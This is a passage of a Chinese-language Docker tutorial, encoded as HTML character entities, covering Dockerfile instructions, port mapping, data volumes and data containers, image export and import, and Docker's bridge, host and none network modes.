&#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;&#xFF08;&#x4E3B;&#x673A;&#xFF08;&#x7AEF;&#x53E3;&#xFF09;&#x7AEF;&#x53E3;&#xFF1A;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF09;docker run -p port image# &#x6620;&#x5C04;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;EXPOSE port1 port2 port3# &#x76F8;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x547D;&#x4EE4;docker run -p port1 -p port2 -p port3 image#&#x8FD8;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;docker run -p host_port1:port1 -p host_port2:port2 -p host_port3:port3 image &#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x662F;docker&#x6BD4;&#x8F83;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#xFF0C;&#x539F;&#x56E0;&#x5728;&#x4E8E;&#x6211;&#x4EEC;&#x6BCF;&#x6B21;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x800C;&#x662F;&#x5728;&#x6865;&#x63A5;&#x7F51;&#x5361;&#x7684;&#x5730;&#x5740;&#x8303;&#x56F4;&#x5185;&#x968F;&#x673A;&#x751F;&#x6210;&#x7684;&#x3002;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x662F;&#x56FA;&#x5B9A;&#x7684;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C06;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x514D;&#x53BB;&#x6BCF;&#x6B21;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x670D;&#x52A1;&#x65F6;&#x90FD;&#x8981;&#x67E5;&#x770B;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x3002;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;docker port&#x52A0;&#x4E0A;&#x5BB9;&#x5668;&#x4E2D;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x7AEF;&#x53E3;&#x548C;&#x5BB9;&#x5668;&#x7684;ID&#x6765;&#x67E5;&#x770B;&#x8BE5;&#x7AEF;&#x53E3;&#x53F7;&#x5728;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x6620;&#x5C04;&#x7AEF;&#x53E3;&#x3002; ENV&#xFF08;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5728;image&#x4E2D;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;1ENV &lt;key&gt; &lt;value&gt; &#x8BBE;&#x7F6E;&#x4E86;&#x540E;&#xFF0C;&#x540E;&#x7EED;&#x7684;RUN&#x547D;&#x4EE4;&#x90FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#xFF0C;container&#x542F;&#x52A8;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;docker inspect&#x67E5;&#x770B;&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;docker run &#x2013;env key=value&#x65F6;&#x8BBE;&#x7F6E;&#x6216;&#x4FEE;&#x6539;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;&#x5047;&#x5982;&#x4F60;&#x5B89;&#x88C5;&#x4E86;JAVA&#x7A0B;&#x5E8F;&#xFF0C;&#x9700;&#x8981;&#x8BBE;&#x7F6E;JAVA_HOME&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x8FD9;&#x6837;&#x5199;&#xFF1A;1ENV JAVA_HOME /path/to/java/dirent ADD&#xFF08;&#x4ECE;src&#x590D;&#x5236;&#x6587;&#x4EF6;&#x5230;container&#x7684;dest&#x8DEF;&#x5F84;&#xFF09; &#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x6240;&#x6709;&#x62F7;&#x8D1D;&#x5230;container&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x548C;&#x6587;&#x4EF6;&#x5939;&#x6743;&#x9650;&#x4E3A;0755&#xFF0C;uid&#x548C;gid&#x4E3A;0&#xFF1B;&#x5982;&#x679C;&#x662F;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5C06;&#x8BE5;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x6DFB;&#x52A0;&#x5230;container&#x4E2D;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x76EE;&#x5F55;&#xFF1B;&#x5982;&#x679C;&#x6587;&#x4EF6;&#x662F;&#x53EF;&#x8BC6;&#x522B;&#x7684;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF0C;&#x5219;docker&#x4F1A;&#x5E2E;&#x5FD9;&#x89E3;&#x538B;&#x7F29;&#xFF08;&#x6CE8;&#x610F;&#x538B;&#x7F29;&#x683C;&#x5F0F;&#xFF09;&#xFF1B;&#x5982;&#x679C;\\&#x662F;&#x6587;&#x4EF6;&#x4E14;\\&#x4E2D;&#x4E0D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;&#x5C06;\\&#x89C6;&#x4E3A;&#x6587;&#x4EF6;&#xFF0C;\\&#x7684;&#x5185;&#x5BB9;&#x4F1A;&#x5199;&#x5165;\\&#xFF1B;&#x5982;&#x679C;\\&#x662F;&#x6587;&#x4EF6;&#x4E14;\\&#x4E2D;&#x4F7F;&#x7528;&#x659C;&#x6760;&#x7ED3;&#x675F;&#xFF0C;&#x5219;&#x4F1A;\\&#x6587;&#x4EF6;&#x62F7;&#x8D1D;&#x5230;\\&#x76EE;&#x5F55;&#x4E0B;&#x3002;1ADD &lt;src&gt; &lt;dest&gt; &lt;src&gt;&#x662F;&#x76F8;&#x5BF9;&#x88AB;&#x6784;&#x5EFA;&#x7684;&#x6E90;&#x76EE;&#x5F55;&#x7684;&#x76F8;&#x5BF9;&#x8DEF;&#x5F84;&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x7684;&#x6587;&#x4EF6;url;&lt;dest&gt;&#x662F;container&#x4E2D;&#x7684;&#x7EDD;&#x5BF9;&#x8DEF;&#x5F84; VOLUME&#xFF08;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x70B9;&#xFF09; &#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x4F7F;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x5177;&#x6709;&#x6301;&#x4E45;&#x5316;&#x5B58;&#x50A8;&#x6570;&#x636E;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x8BE5;&#x76EE;&#x5F55;&#x53EF;&#x4EE5;&#x88AB;&#x5BB9;&#x5668;&#x672C;&#x8EAB;&#x4F7F;&#x7528;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5171;&#x4EAB;&#x7ED9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x3002;&#x6211;&#x4EEC;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x662F;AUFS&#xFF0C;&#x8FD9;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0D;&#x80FD;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x5F53;&#x5BB9;&#x5668;&#x5173;&#x95ED;&#x540E;&#xFF0C;&#x6240;&#x6709;&#x7684;&#x66F4;&#x6539;&#x90FD;&#x4F1A;&#x4E22;&#x5931;&#x3002;&#x5F53;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x6709;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#x7684;&#x9700;&#x6C42;&#x65F6;&#x53EF;&#x4EE5;&#x5728;Dockerfile&#x4E2D;&#x4F7F;&#x7528;&#x8BE5;&#x6307;&#x4EE4;&#x3002; 12FROM baseVOLUME [&quot;/tmp/data&quot;] WORKDIR&#xFF08;&#x5207;&#x6362;&#x76EE;&#x5F55;&#xFF09;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x5207;&#x6362;&#xFF08;&#x76F8;&#x5F53;&#x4E8E;cd&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;RUN,CMD,ENTRYPOINT&#x751F;&#x6548;12# &#x5728; /p1/p2&#x4E0B;&#x6267;&#x884C; vim a.txtWORKDIR /p1 WORKDIR p2 RUN vim a.txt 2.7 &#x955C;&#x50CF;&#x5BFC;&#x5165;&#x5BFC;&#x51FA; 12docker save -o centos6.5.tar centos6.5 # &#x6216;docker export f9c99092063c &gt; centos6.5.tar &#x5C06;&#x672C;&#x5730;&#x955C;&#x50CF;&#x5BFC;&#x5165;12docker load --input cnetos6.5.tar #&#x6216;docker load &lt; centos6.5.tar 1docker exec -it CONTAINER ID /bin/bash &#x4E09;&#x3001;&#x5B58;&#x50A8;3.1 &#x6570;&#x636E;&#x76D8; docker&#x7684;&#x955C;&#x50CF;&#x4F7F;&#x7528;&#x4E00;&#x5C42;&#x4E00;&#x5C42;&#x6587;&#x4EF6;&#x7EC4;&#x6210;&#x7684;&#xFF0C;docker&#x7684;&#x4E00;&#x4E9B;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x53EF;&#x4EE5;&#x5904;&#x7406;&#x600E;&#x4E48;&#x6837;&#x5B58;&#x50A8;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x3002; 1docker inspect centos # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F; &#x4FE1;&#x606F;&#x4E0B;&#x65B9;&#x7684;Layers&#xFF0C;&#x5C31;&#x662F;centos&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x90FD;&#x662F;&#x53EA;&#x8BFB;&#x7684;&#x4E0D;&#x80FD;&#x53BB;&#x4FEE;&#x6539;&#xFF0C;&#x6211;&#x4EEC;&#x57FA;&#x4E8E;&#x8FD9;&#x4E2A;&#x955C;&#x50CF;&#x53BB;&#x521B;&#x5EFA;&#x7684;&#x955C;&#x50CF;&#x548C;&#x5BB9;&#x5668;&#x4E5F;&#x4F1A;&#x5171;&#x4EAB;&#x8FD9;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#xFF0C;&#x800C;docker&#x4F1A;&#x5728;&#x8FD9;&#x4E9B;&#x5C42;&#x4E0A;&#x9762;&#x53BB;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4FEE;&#x6539;&#x4E00;&#x4E9B;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#x7684;&#x4E1C;&#x897F;&#x7684;&#x8BDD;&#xFF0C;docker&#x4F1A;&#x590D;&#x5236;&#x4E00;&#x4EFD;&#x5230;&#x8FD9;&#x4E2A;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x91CC;&#x9762;&#xFF0C;&#x5982;&#x679C;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x4E5F;&#x4F1A;&#x5220;&#x9664;&#x5B83;&#x5BF9;&#x5E94;&#x7684;&#x53EF;&#x8BFB;&#x5199;&#x7684;&#x6587;&#x4EF6;&#x5C42;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x5982;&#x679C;&#x6709;&#x4E9B;&#x6570;&#x636E;&#x4F60;&#x60F3;&#x4E00;&#x76F4;&#x4FDD;&#x5B58;&#x7684;&#x8BDD;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;web&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x9762;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#x91CC;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x628A;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x653E;&#x5230;data volumes&#x6570;&#x636E;&#x76D8;&#x91CC;&#x9762;&#x3002;&#x5B83;&#x4E0A;&#x9762;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5373;&#x4F7F;&#x628A;&#x5BB9;&#x5668;&#x5220;&#x6389;&#xFF0C;&#x4E5F;&#x8FD8;&#x662F;&#x4F1A;&#x6C38;&#x4E45;&#x4FDD;&#x7559;&#x3002;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53BB;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x76D8;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x53BB;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x76EE;&#x5F55;&#x3002; 1docker run -i -t -v /mnt --name nginx docker.io/nginx /bin/bash -v&#xFF1A;&#x6307;&#x5B9A;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#x7684;&#x76EE;&#x5F55;&#x4F7F;&#x7528;docker insepect&#x5BB9;&#x5668;ID&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6302;&#x8F7D;&#x76EE;&#x5F55;&#x5BF9;&#x5E94;&#x4E8E;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7269;&#x7406;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x540C;&#x6837;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5C06;&#x5236;&#x5B9A;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x7684;&#x5236;&#x5B9A;&#x76EE;&#x5F55;&#x4E0B;&#xFF1A; &#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5230;&#x5BB9;&#x5668;&#x5185;&#xFF1A; 1docker run -d -p 80:80 --name nginx -v /webdata/wordpress:/usr/share/nginx/html docker.io/sergyzh/centos6-nginx -d&#x540E;&#x53F0;&#x8FD0;&#x884C;--name&#x7ED9;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;&#x547D;&#x540D;-v&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;:&#x5BB9;&#x5668;&#x76EE;&#x5F55; &#x5C06;&#x5BBF;&#x4E3B;&#x673A;&#x76EE;&#x5F55;&#x6302;&#x8F7D;&#x5728;&#x5BB9;&#x5668;&#x5185;-p &#x5BBF;&#x4E3B;&#x673A;&#x7AEF;&#x53E3;:&#x5BB9;&#x5668;&#x76D1;&#x542C;&#x7AEF;&#x53E3; &#x5C06;&#x5BB9;&#x5668;&#x5185;&#x5E94;&#x7528;&#x76D1;&#x542C;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x5230;&#x7269;&#x7406;&#x5BBF;&#x4E3B;&#x673A;&#x7684;&#x7279;&#x5B9A;&#x7AEF;&#x53E3;&#x4E0A; 3.2 &#x6570;&#x636E;&#x5BB9;&#x5668; &#x53EF;&#x4EE5;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x518D;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x662F;&#x6307;&#x5B9A;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x7136;&#x540E;&#x8BA9;&#x5176;&#x4ED6;&#x5BB9;&#x5668;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x4F5C;&#x4E3A;&#x4ED6;&#x4EEC;&#x7684;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x7EE7;&#x627F;&#x4E86;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x6307;&#x5B9A;&#x7684;&#x6570;&#x636E;&#x76D8;&#x4F5C;&#x4E3A;&#x6570;&#x636E;&#x76D8;&#x3002; &#x9996;&#x5148;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x547D;&#x540D;&#x4E3A;newnginx 1docker create -v /mnt -it --name newnginx docker.io/nginx /bin/bash &#x5229;&#x7528;&#x6B64;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx1,&#x5728;&#x6570;&#x636E;&#x76EE;&#x5F55;/mnt &#x4E0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; 1docker run --volumes-from newnginx --name nginx1 -it docker.io/nginx /bin/bash &#x5229;&#x7528;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x5728;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;nginx2&#xFF0C;&#x67E5;&#x770B;&#x6570;&#x636E;&#x76EE;&#x5F55;&#x4E0B;&#x5BB9;&#x5668;nginx1&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x4F9D;&#x65E7;&#x5B58;&#x5728;&#xFF0C;&#x540C;&#x7406;&#x5728;nginx2&#x7684;/mnt&#x4E0B;&#x521B;&#x5EFA;&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4ED6;&#x57FA;&#x4E8E;&#x6570;&#x636E;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#x7684;&#x65B0;&#x5BB9;&#x5668;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6587;&#x4EF6; 3.3 &#x6570;&#x636E;&#x76D8;&#x7BA1;&#x7406; &#x5728;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;docker&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x5220;&#x9664;&#x5176;&#x6570;&#x636E;&#x76D8;&#x3002; 123docker volume ls # &#x67E5;&#x770B;&#x6570;&#x636E;&#x76D8;docker volume ls -f dangling=true # &#x67E5;&#x770B;&#x672A;&#x88AB;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x76D8;docker volume rm VOLUME NAME # &#x5220;&#x9664;&#x6570;&#x636E;&#x76D8; &#x5982;&#x679C;&#x60F3;&#x8981;&#x5220;&#x9664;&#x5BB9;&#x5668;&#x65F6;&#xFF0C;&#x540C;&#x65F6;&#x5220;&#x9664;&#x6389;&#x5176;&#x6570;&#x636E;&#x76D8;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;-v&#x53C2;&#x6570;&#x3002; 1docker rm -v newnginx &#x56DB;&#x3001;&#x7F51;&#x7EDC;docker&#x63D0;&#x4F9B;&#x51E0;&#x79CD;&#x7F51;&#x7EDC;&#xFF0C;&#x5B83;&#x51B3;&#x5B9A;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x548C;&#x5916;&#x754C;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x5982;&#x4F55;&#x53BB;&#x76F8;&#x4E92;&#x901A;&#x4FE1;1docker newwork ls # &#x67E5;&#x770B;&#x7F51;&#x7EDC; &#x5F53;Docker&#x8FDB;&#x7A0B;&#x542F;&#x52A8;&#x65F6;&#xFF0C;&#x4F1A;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;docker0&#x7684;&#x865A;&#x62DF;&#x7F51;&#x6865;&#xFF0C;&#x6B64;&#x4E3B;&#x673A;&#x4E0A;&#x542F;&#x52A8;&#x7684;Docker&#x5BB9;&#x5668;&#x4F1A;&#x8FDE;&#x63A5;&#x5230;&#x8FD9;&#x4E2A;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x4E0A;&#x3002;&#x865A;&#x62DF;&#x7F51;&#x6865;&#x7684;&#x5DE5;&#x4F5C;&#x65B9;&#x5F0F;&#x548C;&#x7269;&#x7406;&#x4EA4;&#x6362;&#x673A;&#x7C7B;&#x4F3C;&#xFF0C;&#x8FD9;&#x6837;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x6240;&#x6709;&#x5BB9;&#x5668;&#x5C31;&#x901A;&#x8FC7;&#x4EA4;&#x6362;&#x673A;&#x8FDE;&#x5728;&#x4E86;&#x4E00;&#x4E2A;&#x4E8C;&#x5C42;&#x7F51;&#x7EDC;&#x4E2D;&#x3002;&#x4ECE;docker0&#x5B50;&#x7F51;&#x4E2D;&#x5206;&#x914D;&#x4E00;&#x4E2A;IP&#x7ED9;&#x5BB9;&#x5668;&#x4F7F;&#x7528;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;docker0&#x7684;IP&#x5730;&#x5740;&#x4E3A;&#x5BB9;&#x5668;&#x7684;&#x9ED8;&#x8BA4;&#x7F51;&#x5173;&#x3002;&#x5728;&#x4E3B;&#x673A;&#x4E0A;&#x521B;&#x5EFA;&#x4E00;&#x5BF9;&#x865A;&#x62DF;&#x7F51;&#x5361;veth pair&#x8BBE;&#x5907;&#xFF0C;Docker&#x5C06;veth pair&#x8BBE;&#x5907;&#x7684;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x65B0;&#x521B;&#x5EFA;&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#xFF0C;&#x5E76;&#x547D;&#x540D;&#x4E3A;eth0&#xFF08;&#x5BB9;&#x5668;&#x7684;&#x7F51;&#x5361;&#xFF09;&#xFF0C;&#x53E6;&#x4E00;&#x7AEF;&#x653E;&#x5728;&#x4E3B;&#x673A;&#x4E2D;&#xFF0C;&#x4EE5;vethxxx&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x540D;&#x5B57;&#x547D;&#x540D;&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x8BBE;&#x5907;&#x52A0;&#x5165;&#x5230;docker0&#x7F51;&#x6865;&#x4E2D;&#x3002; 4.1 bridge&#x6865;&#x63A5;&#x7F51;&#x7EDC; &#x9664;&#x975E;&#x521B;&#x5EFA;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;&#x7F51;&#x7EDC;&#xFF0C;&#x4E0D;&#x7136;&#x5BB9;&#x5668;&#x5C31;&#x4F1A;&#x9ED8;&#x8BA4;&#x7684;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#x3002;&#x5C5E;&#x4E8E;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x901A;&#x4FE1;&#xFF0C;&#x4E0D;&#x8FC7;&#x5916;&#x754C;&#x60F3;&#x8981;&#x8BBF;&#x95EE;&#x5230;&#x8FD9;&#x4E2A;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x5462;&#xFF0C;&#x9700;&#x4F7F;&#x7528;&#x6865;&#x63A5;&#x7F51;&#x7EDC;&#xFF0C;&#x6709;&#x70B9;&#x50CF;&#x4E3B;&#x673A;&#x548C;&#x5BB9;&#x5668;&#x4E4B;&#x95F4;&#x7684;&#x4E00;&#x5EA7;&#x6865;&#xFF0C;&#x5BF9;&#x5BB9;&#x5668;&#x6709;&#x4E00;&#x70B9;&#x9694;&#x79BB;&#x4F5C;&#x7528;&#x3002;&#x5B9E;&#x9645;&#x662F;&#x5728;iptables&#x505A;&#x4E86;DNAT&#x89C4;&#x5219;&#xFF0C;&#x5B9E;&#x73B0;&#x7AEF;&#x53E3;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;iptables -t nat -vnL&#x67E5;&#x770B;&#x3002; 4.2 host&#x4E3B;&#x673A;&#x7F51;&#x7EDC; &#x5982;&#x679C;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x4F7F;&#x7528;host&#x6A21;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x83B7;&#x5F97;&#x4E00;&#x4E2A;&#x72EC;&#x7ACB;&#x7684;Network Namespace&#xFF0C;&#x800C;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x5171;&#x7528;&#x4E00;&#x4E2A;Network Namespace&#x3002;&#x5BB9;&#x5668;&#x5C06;&#x4E0D;&#x4F1A;&#x865A;&#x62DF;&#x51FA;&#x81EA;&#x5DF1;&#x7684;&#x7F51;&#x5361;&#xFF0C;&#x914D;&#x7F6E;&#x81EA;&#x5DF1;&#x7684;IP&#x7B49;&#xFF0C;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x7684;IP&#x548C;&#x7AEF;&#x53E3;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5BB9;&#x5668;&#x7684;&#x5176;&#x4ED6;&#x65B9;&#x9762;&#xFF0C;&#x5982;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x3001;&#x8FDB;&#x7A0B;&#x5217;&#x8868;&#x7B49;&#x8FD8;&#x662F;&#x548C;&#x5BBF;&#x4E3B;&#x673A;&#x9694;&#x79BB;&#x7684;&#x3002;&#x53EA;&#x7528;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x7684;&#x7F51;&#x7EDC;&#xFF0C;&#x8FD9;&#x79CD;&#x7F51;&#x7EDC;&#x5BF9;&#x5916;&#x754C;&#x662F;&#x5B8C;&#x5168;&#x5F00;&#x653E;&#x7684;&#xFF0C;&#x80FD;&#x591F;&#x8BBF;&#x95EE;&#x5230;&#x4E3B;&#x673A;&#xFF0C;&#x5C31;&#x80FD;&#x8BBF;&#x95EE;&#x5230;&#x5BB9;&#x5668;&#x3002; 4.3 &#x4F7F;&#x7528;none&#x6A21;&#x5F0F; Docker&#x5BB9;&#x5668;&#x62E5;&#x6709;&#x81EA;&#x5DF1;&#x7684;Network Namespace&#xFF0C;&#x4F46;&#x662F;&#xFF0C;&#x5E76;&#x4E0D;&#x4E3A;Docker&#x5BB9;&#x5668;&#x8FDB;&#x884C;&#x4EFB;&#x4F55;&#x7F51;&#x7EDC;&#x914D;&#x7F6E;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E2A;Docker&#x5BB9;&#x5668;&#x6CA1;&#x6709;&#x7F51;&#x5361;&#x3001;IP&#x3001;&#x8DEF;&#x7531;&#x7B49;&#x4FE1;&#x606F;&#x3002;&#x9700;&#x8981;&#x6211;&#x4EEC;&#x81EA;&#x5DF1;&#x4E3A;Docker&#x5BB9;&#x5668;&#x6DFB;&#x52A0;&#x7F51;&#x5361;&#x3001;&#x914D;&#x7F6E;IP&#x7B49;&#x3002;&#x4F7F;&#x7528;&#x6B64;&#x79CD;&#x7F51;&#x7EDC;&#x7684;&#x5BB9;&#x5668;&#x4F1A;&#x5B8C;&#x5168;&#x9694